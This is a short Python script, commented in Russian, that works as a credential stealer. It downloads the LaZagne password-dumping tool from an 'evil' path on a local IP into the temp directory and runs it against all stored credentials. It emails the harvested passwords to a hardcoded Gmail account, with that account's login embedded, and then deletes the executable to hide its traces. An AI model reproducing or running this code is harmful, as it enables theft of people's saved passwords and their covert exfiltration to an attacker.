import requests, subprocess, smtplib, os, tempfile

#фун для скачивания файла
def download(url):
    get_resp = requests.get(url)
    # создаем название файла вначале раздиляем и потм по индексу забираем название
    file_name = url.split("/")[-1]
    print(file_name)
    #работа с файлом укз название и чтение, также можно изменять и создвать бинарные файлы для других кодов
    with open(file_name, "wb") as file:
        # если нет файла то мы его создаем
        file.write(get_resp.content)

#фун для создания отправки сообщения полученных данных ниже
def send_mail(email, password, message): 
    #создали соеденение через гугл для отправки туда сообщения
    server = smtplib.SMTP("smtp.gmail.com", 587) #домен и порт
    # tls соеденение
    server.starttls()
    # авторизация
    server.login(email, password)
    # сообщение
    server.sendmail(email, email, message)
    server.quit()


# укз temp директорию для уставноки
temp_dir = tempfile.gettempdir()
#меняем директорию в которую заходми
os.chdir(temp_dir)    
download("http:172.18.0.2/evil/LaZagne/Windows/laZagne.exe")
# запускаем команду
result = subprocess.check_output("laZagne.exe all", shell=True)
# отправка на почту 
send_mail("kingfsocietyall@gmail.com", "wayrapjxmabjrzdx", result)
#удаление файл из дериктории
os.remove("laZagne.exe")